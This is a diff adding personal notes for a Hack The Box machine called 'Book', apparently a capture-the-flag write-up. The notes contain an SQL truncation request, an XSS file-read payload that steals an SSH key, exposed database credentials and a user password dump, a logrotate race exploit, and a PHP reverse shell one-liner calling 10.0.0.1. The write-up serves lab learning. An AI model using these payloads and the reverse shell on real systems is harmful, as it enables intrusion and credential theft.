@@ -1,0 +1,122 @@
+nmap -sC -sV -oN nmap 10.10.10.176 -v -A
+
+80 and 22
+
+register as admin:admin@admin.com:admin
+
+cant login in /admin
+csrf to change role -> doesnt work
+
+admin@book.htb -> admin email
+tried to upload revshell but rabbit hole
+lets bf to admin login page as i know mail
+
+try to register as admin@book.htb (add a space e.g.)
+this function in js script:
+
+```js
+function validateForm() {
+  var x = document.forms["myForm"]["name"].value;
+  var y = document.forms["myForm"]["email"].value;
+  if (x == "") {
+    alert("Please fill name field. Should not be more than 10 characters");
+    return false;
+  }
+  if (y == "") {
+    alert("Please fill email field. Should not be more than 20 characters");
+    return false;
+  }
+}
+```
+
+lets overwrite the admin account
+(sql truncation attack - discovered with db.php in dirbuster)
+name=admina&email=admin%40book.htb         3&password=allo
+
+logged in as admin -> can now dl collections list with the ones that users send
+after some tests with the pdf as the payload -> does not appear in the collections
+what appears is the author / book name
+
+-> https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html
+
+in collections -> put payload in book title
+```html
+<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
+```
+
+syslog -> lets try to dump private ssh key or user flag:
+/home/syslog/.ssh/id_rsa
+/home/syslog/user.txt
+-> fail
+
+same thing with reader user:
+/home/reader/.ssh/id_rsa -> got it!
+ssh2john says it has no password
+
+ssh reader@10.10.10.176 -i privkey -> user flag
+51c1d4b5197fa30e3e5d37f8778f95bc
+
+in /var/www/html -> can finally read db.php:
+
+```php
+<?php
+$conn = mysqli_connect("localhost","book_admin","I_Hate_Book_Reading","book");
+// Check connection
+if (mysqli_connect_errno())
+  {
+  echo "Failed to connect to MySQL: " . mysqli_connect_error();
+  }
+?>
+```
+
+mysqldump -ubook_admin -pI_Hate_Book_Reading book
+
+```sql
+...
+LOCK TABLES `users` WRITE;
+/*!40000 ALTER TABLE `users` DISABLE KEYS */;
+INSERT INTO `users` VALUES ('admin','admin@book.htb','Sup3r_S3cur3_P455'),('test','a@b.com','test'),('shaunwhort','test@test.com','casablancas1'),('peter','hi@hello.com','password');
+/*!40000 ALTER TABLE `users` ENABLE KEYS */;
+UNLOCK TABLES;
+...
+```
+
+-> useless? None of the passwds work for root / sudo
+
+enumerate
+- linenum -> nothing
+- linpeas -> nothing
+- pspy64 -> logrotate?
+
+```
+...
+2020/06/07 19:36:14 CMD: UID=???  PID=26591  | /usr/sbin/logrotate -f /root/log.cfg
+...
+```
+
+indeed linenum shows:
+
+```
+/etc/cron.daily:
+total 68
+drwxr-xr-x  2 root root 4096 Dec  3  2019 .
+drwxr-xr-x 99 root root 4096 Feb 19 14:09 ..
+...
+-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
+...
+```
+
+https://hackerone.com/reports/578119
+-> race condition exploit in logrotate
+
+use https://www.exploit-db.com/exploits/47466 with logs in ~/backups
+see https://github.com/whotwagner/logrotten for better details
+
+in logrotate.conf -> create option
+./logrotten -p ./payloadfile ~/backups/access.log
+
+does not work with payload from doc
+-> try php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+shell as root on listener:
+84da92adf998a1c7231297f70dd89714
